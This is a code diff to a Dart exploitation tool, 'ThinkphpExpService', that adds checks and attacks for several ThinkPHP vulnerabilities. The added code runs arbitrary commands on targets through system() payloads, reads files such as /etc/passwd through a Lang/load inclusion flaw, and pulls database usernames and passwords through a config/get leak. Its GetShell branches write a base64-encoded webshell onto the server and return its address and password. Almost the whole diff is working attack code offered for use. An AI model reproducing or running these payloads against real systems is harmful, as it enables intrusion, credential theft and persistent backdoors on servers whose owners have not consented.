@@ -209,7 +209,7 @@ class ThinkphpExpService {
     final mod = await _getModule();
     final payload = '${baseUri}?s=$mod/\\think\\module/action/param1/\${@phpinfo()}';
     try {
-      final res = await http.get(baseUri).timeout(timeout);
+      final res = await http.get(Uri.parse(payload)).timeout(timeout);
       if (res.body.contains(_phpVersionCheck)) {
         return ThinkphpResult(true, 'ThinkPHP 3.x RCE', payload);
       }
@@ -281,7 +281,129 @@ class ThinkphpExpService {
     return ThinkphpResult(false, 'ThinkPHP 3.x Log RCE', '');
   }
 
-  /// 11. ThinkPHP 6.x 日志泄露
+  /// 12. ThinkPHP 5.0.23 完整版 debug 模式（无需 captcha）
+  Future<ThinkphpResult> checkTp5023Debug() async {
+    final payloads = [
+      {'_method': '__construct', 'filter[]': 'phpinfo', 'server[REQUEST_METHOD]': '1'},
+      {'_method': '__construct', 'filter[]': 'phpinfo', 'method': 'get', 'server[REQUEST_METHOD]': '1'},
+    ];
+    for (final body in payloads) {
+      try {
+        final res = await http.post(baseUri, body: body).timeout(timeout);
+        if (res.body.contains(_phpVersionCheck)) {
+          return ThinkphpResult(true, 'ThinkPHP 5.0.23 Debug RCE', 'POST $baseUri');
+        }
+      } catch (_) {}
+    }
+    return ThinkphpResult(false, 'ThinkPHP 5.0.23 Debug RCE', '');
+  }
+
+  /// 13. ThinkPHP 5 View/display（POC #5）
+  Future<ThinkphpResult> checkTp5ViewDisplay() async {
+    final mod = await _getModule();
+    final content = Uri.encodeComponent('<?php phpinfo();?>');
+    final urls = [
+      '${baseUri}?s=/$mod/\\think\\View/display&content=$content&data=1',
+      '${baseUri}?s=/$mod/\\think\\view\\driver\\Php/display&content=$content',
+    ];
+    for (final u in urls) {
+      try {
+        final res = await http.get(Uri.parse(u)).timeout(timeout);
+        if (res.body.contains(_phpVersionCheck)) {
+          return ThinkphpResult(true, 'ThinkPHP 5 View/display RCE', u);
+        }
+      } catch (_) {}
+    }
+    return ThinkphpResult(false, 'ThinkPHP 5 View/display RCE', '');
+  }
+
+  /// 14. ThinkPHP 5.0/5.1/5.2 _method=filter（POC #35）
+  Future<ThinkphpResult> checkTp5MethodFilter() async {
+    final payloads = [
+      {'c': 'phpinfo', 'f': '-1', '_method': 'filter'},
+      {'a': 'phpinfo', 'b': '-1', '_method': 'filter'},
+    ];
+    for (final body in payloads) {
+      try {
+        final res = await http.post(baseUri, body: body).timeout(timeout);
+        if (res.body.contains(_phpVersionCheck)) {
+          return ThinkphpResult(true, 'ThinkPHP 5.x _method=filter RCE', 'POST $baseUri');
+        }
+      } catch (_) {}
+    }
+    return ThinkphpResult(false, 'ThinkPHP 5.x _method=filter RCE', '');
+  }
+
+  /// 15. ThinkPHP 3.x Module/Action/Param 变体（POC #17）
+  Future<ThinkphpResult> checkTp3Module() async {
+    final mod = await _getModule();
+    final payload = '${baseUri}?s=$mod/\\think\\Module/Action/Param/\${@phpinfo()}';
+    try {
+      final res = await http.get(Uri.parse(payload)).timeout(timeout);
+      if (res.body.contains(_phpVersionCheck)) {
+        return ThinkphpResult(true, 'ThinkPHP 3.x Module RCE', payload);
+      }
+    } catch (_) {}
+    return ThinkphpResult(false, 'ThinkPHP 3.x Module RCE', '');
+  }
+
+  /// 16. ThinkPHP 5.x Lang/load 任意文件包含（tp5_file_include）
+  /// 需开启多语言 lang_switch_on，影响 TP5.0.x / 5.1.x / 6.0.1-6.0.13
+  Future<ThinkphpResult> checkTp5FileInclude() async {
+    final mod = await _getModule();
+    final filePayloads = ['/etc/passwd', '....//....//....//....//etc/passwd', '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'];
+    for (final file in filePayloads) {
+      try {
+        final u = '${baseUri}?s=$mod/\\think\\Lang/load&file=${Uri.encodeComponent(file)}';
+        final res = await http.get(Uri.parse(u)).timeout(timeout);
+        if (res.body.contains('root:') || res.body.contains('root:x:')) {
+          return ThinkphpResult(true, 'ThinkPHP 5.x Lang/load 文件包含', u);
+        }
+      } catch (_) {}
+    }
+    return ThinkphpResult(false, 'ThinkPHP 5.x Lang/load 文件包含', '');
+  }
+
+  /// 17. ThinkPHP 5.0.22 config/get 信息泄露（POC #1-2）
+  Future<ThinkphpResult> checkTp5ConfigGet() async {
+    final payloads = [
+      'database.username',
+      'database.password',
+      'database.hostname',
+      'app_debug',
+    ];
+    final pathVariants = ['.|think\\config/get', 'index|think\\config/get'];
+    for (final path in pathVariants) {
+      for (final name in payloads) {
+        try {
+          final u = '${baseUri}?s=$path&name=$name';
+          final res = await http.get(Uri.parse(u)).timeout(timeout);
+          if (res.statusCode == 200 && res.body.isNotEmpty && res.body.length < 500 && !res.body.contains('<!DOCTYPE')) {
+            final val = res.body.trim();
+            if (val.isNotEmpty && !val.startsWith('{') && !val.contains('<html')) {
+              return ThinkphpResult(true, 'ThinkPHP 5.0.22 config 泄露', '$name=$val');
+            }
+          }
+        } catch (_) {}
+      }
+    }
+    return ThinkphpResult(false, 'ThinkPHP 5.0.22 config 泄露', '');
+  }
+
+  /// 18. ThinkPHP 3.x module/aciton 拼写变体（POC #18）
+  Future<ThinkphpResult> checkTp3ModuleTypo() async {
+    final mod = await _getModule();
+    final payload = '${baseUri}?s=$mod/\\think\\module/aciton/param1/\${@phpinfo()}';
+    try {
+      final res = await http.get(Uri.parse(payload)).timeout(timeout);
+      if (res.body.contains(_phpVersionCheck)) {
+        return ThinkphpResult(true, 'ThinkPHP 3.x module/aciton RCE', payload);
+      }
+    } catch (_) {}
+    return ThinkphpResult(false, 'ThinkPHP 3.x module/aciton RCE', '');
+  }
+
+  /// 19. ThinkPHP 6.x 日志泄露
   Future<ThinkphpResult> checkTp6Log() async {
     final now = DateTime.now();
     final y = now.year.toString();
@@ -319,14 +441,28 @@ class ThinkphpExpService {
         return checkTp5022_5129();
       case ThinkphpVulnType.tp5023:
         return checkTp5023();
+      case ThinkphpVulnType.tp5023Debug:
+        return checkTp5023Debug();
       case ThinkphpVulnType.tp5024_5130:
         return checkTp5024_5130();
+      case ThinkphpVulnType.tp5ViewDisplay:
+        return checkTp5ViewDisplay();
+      case ThinkphpVulnType.tp5MethodFilter:
+        return checkTp5MethodFilter();
+      case ThinkphpVulnType.tp5FileInclude:
+        return checkTp5FileInclude();
+      case ThinkphpVulnType.tp5ConfigGet:
+        return checkTp5ConfigGet();
       case ThinkphpVulnType.tp5Db:
         return checkTp5Db();
       case ThinkphpVulnType.tp5Log:
         return checkTp5Log();
       case ThinkphpVulnType.tp3:
         return checkTp3();
+      case ThinkphpVulnType.tp3Module:
+        return checkTp3Module();
+      case ThinkphpVulnType.tp3ModuleTypo:
+        return checkTp3ModuleTypo();
       case ThinkphpVulnType.tp3Log:
         return checkTp3Log();
       case ThinkphpVulnType.tp3LogRce:
@@ -352,8 +488,14 @@ class ThinkphpExpService {
       ThinkphpVulnType.tp5010,
       ThinkphpVulnType.tp5022_5129,
       ThinkphpVulnType.tp5023,
+      ThinkphpVulnType.tp5023Debug,
       ThinkphpVulnType.tp5024_5130,
+      ThinkphpVulnType.tp5ViewDisplay,
+      ThinkphpVulnType.tp5MethodFilter,
+      ThinkphpVulnType.tp5FileInclude,
       ThinkphpVulnType.tp3,
+      ThinkphpVulnType.tp3Module,
+      ThinkphpVulnType.tp3ModuleTypo,
       ThinkphpVulnType.tp3LogRce,
     ]);
   }
@@ -400,6 +542,38 @@ class ThinkphpExpService {
           if (out.isNotEmpty) return out;
         }
         return null;
+
+      case ThinkphpVulnType.tp5023Debug:
+        final body = {'_method': '__construct', 'filter[]': 'system', 'server[REQUEST_METHOD]': cmd};
+        final res = await http.post(baseUri, body: body).timeout(timeout);
+        return _extractBeforeHtml(res.body);
+
+      case ThinkphpVulnType.tp5ViewDisplay:
+        final content = Uri.encodeComponent('<?php system(\$_GET["c"]);?>');
+        final u = '${baseUri}?s=/$mod/\\think\\view\\driver\\Php/display&content=$content&c=$encodedCmd';
+        final res = await http.get(Uri.parse(u)).timeout(timeout);
+        return _extractBeforeHtml(res.body);
+
+      case ThinkphpVulnType.tp5MethodFilter:
+        final body = {'c': 'system', 'f': cmd, '_method': 'filter'};
+        final res = await http.post(baseUri, body: body).timeout(timeout);
+        return _extractBeforeHtml(res.body);
+
+      case ThinkphpVulnType.tp5FileInclude:
+        final filePath = cmd.trim().isEmpty ? '/etc/passwd' : cmd.trim();
+        final u = '${baseUri}?s=$mod/\\think\\Lang/load&file=${Uri.encodeComponent(filePath)}';
+        final res = await http.get(Uri.parse(u)).timeout(timeout);
+        return res.body;
+
+      case ThinkphpVulnType.tp3Module:
+        final u = '${baseUri}?s=$mod/\\think\\Module/Action/Param/{\${system(\$_GET[\'x\'])}}?x=$encodedCmd';
+        final res = await http.get(Uri.parse(u)).timeout(timeout);
+        return res.body;
+
+      case ThinkphpVulnType.tp3ModuleTypo:
+        final u = '${baseUri}?s=$mod/\\think\\module/aciton/param1/{\${system(\$_GET[\'x\'])}}?x=$encodedCmd';
+        final res = await http.get(Uri.parse(u)).timeout(timeout);
+        return res.body;
 
       case ThinkphpVulnType.tp5024_5130:
         final u = '${baseUri}?s=$mod/\\think\\Request/input&filter=system&data=$encodedCmd';
@@ -500,6 +674,51 @@ class ThinkphpExpService {
         }
         return null;
 
+      case ThinkphpVulnType.tp5023Debug:
+        final cmd = "echo '$shellB64'|base64 -d>$shellFile";
+        final body = {'_method': '__construct', 'filter[]': 'system', 'server[REQUEST_METHOD]': cmd};
+        await http.post(baseUri, body: body).timeout(timeout);
+        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
+        if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
+        return null;
+
+      case ThinkphpVulnType.tp5ViewDisplay:
+        final phpCode = "<?php file_put_contents('$shellFile', base64_decode('$shellB64'));?>";
+        final contentEnc = Uri.encodeComponent(phpCode);
+        final u = '${baseUri}?s=/$mod/\\think\\view\\driver\\Php/display&content=$contentEnc';
+        await http.get(Uri.parse(u)).timeout(timeout);
+        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
+        if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
+        return null;
+
+      case ThinkphpVulnType.tp5MethodFilter:
+        final cmd = "echo '$shellB64'|base64 -d>$shellFile";
+        final body = {'c': 'system', 'f': cmd, '_method': 'filter'};
+        await http.post(baseUri, body: body).timeout(timeout);
+        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
+        if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
+        return null;
+
+      case ThinkphpVulnType.tp5FileInclude:
+        // Lang/load 为文件包含，无法直接写马；需配合日志包含或 pearcmd 链
+        return null;
+
+      case ThinkphpVulnType.tp3Module:
+        final cmd = Uri.encodeComponent("echo '$shellB64'|base64 -d>$shellFile");
+        final u = '${baseUri}?s=$mod/\\think\\Module/Action/Param/{\${system(\$_GET[\'x\'])}}?x=$cmd';
+        await http.get(Uri.parse(u)).timeout(timeout);
+        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
+        if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
+        return null;
+
+      case ThinkphpVulnType.tp3ModuleTypo:
+        final cmd = Uri.encodeComponent("echo '$shellB64'|base64 -d>$shellFile");
+        final u = '${baseUri}?s=$mod/\\think\\module/aciton/param1/{\${system(\$_GET[\'x\'])}}?x=$cmd';
+        await http.get(Uri.parse(u)).timeout(timeout);
+        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
+        if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
+        return null;
+
       case ThinkphpVulnType.tp5024_5130:
         final cmd = Uri.encodeComponent("echo '$shellB64'|base64 -d>$shellFile");
         final u = '${baseUri}?s=$mod/\\think\\Request/input&filter=system&data=$cmd';
@@ -546,10 +765,17 @@ enum ThinkphpVulnType {
   tp5010,
   tp5022_5129,
   tp5023,
+  tp5023Debug,
   tp5024_5130,
+  tp5ViewDisplay,
+  tp5MethodFilter,
+  tp5FileInclude,
+  tp5ConfigGet,
   tp5Db,
   tp5Log,
   tp3,
+  tp3Module,
+  tp3ModuleTypo,
   tp3Log,
   tp3LogRce,
   tp6Log,
@@ -566,14 +792,28 @@ extension ThinkphpVulnTypeExt on ThinkphpVulnType {
         return 'ThinkPHP 5.0.22/5.1.29 RCE';
       case ThinkphpVulnType.tp5023:
         return 'ThinkPHP 5.0.23 RCE';
+      case ThinkphpVulnType.tp5023Debug:
+        return 'ThinkPHP 5.0.23 Debug RCE';
       case ThinkphpVulnType.tp5024_5130:
         return 'ThinkPHP 5.0.24-5.1.30 RCE';
+      case ThinkphpVulnType.tp5ViewDisplay:
+        return 'ThinkPHP 5 View/display RCE';
+      case ThinkphpVulnType.tp5MethodFilter:
+        return 'ThinkPHP 5.x _method=filter RCE';
+      case ThinkphpVulnType.tp5FileInclude:
+        return 'ThinkPHP 5.x Lang/load 文件包含';
+      case ThinkphpVulnType.tp5ConfigGet:
+        return 'ThinkPHP 5.0.22 config 泄露';
       case ThinkphpVulnType.tp5Db:
         return 'ThinkPHP 5.x 数据库信息泄露';
       case ThinkphpVulnType.tp5Log:
         return 'ThinkPHP 5.x 日志泄露';
       case ThinkphpVulnType.tp3:
         return 'ThinkPHP 3.x RCE';
+      case ThinkphpVulnType.tp3Module:
+        return 'ThinkPHP 3.x Module RCE';
+      case ThinkphpVulnType.tp3ModuleTypo:
+        return 'ThinkPHP 3.x module/aciton RCE';
       case ThinkphpVulnType.tp3Log:
         return 'ThinkPHP 3.x 日志泄露';
       case ThinkphpVulnType.tp3LogRce:
@@ -589,13 +829,25 @@ extension ThinkphpVulnTypeExt on ThinkphpVulnType {
       case ThinkphpVulnType.tp5010:
       case ThinkphpVulnType.tp5022_5129:
       case ThinkphpVulnType.tp5023:
+      case ThinkphpVulnType.tp5023Debug:
       case ThinkphpVulnType.tp5024_5130:
+      case ThinkphpVulnType.tp5ViewDisplay:
+      case ThinkphpVulnType.tp5MethodFilter:
+      case ThinkphpVulnType.tp5FileInclude: // 支持读文件（命令框填路径）
       case ThinkphpVulnType.tp3:
+      case ThinkphpVulnType.tp3Module:
+      case ThinkphpVulnType.tp3ModuleTypo:
       case ThinkphpVulnType.tp3LogRce:
         return true;
       default:
         return false;
     }
+  }
+
+  /// 是否支持 GetShell（文件包含类不支持直接写马）
+  bool get supportsGetShell {
+    if (!supportsRce) return false;
+    return this != ThinkphpVulnType.tp5FileInclude;
   }
 }
 
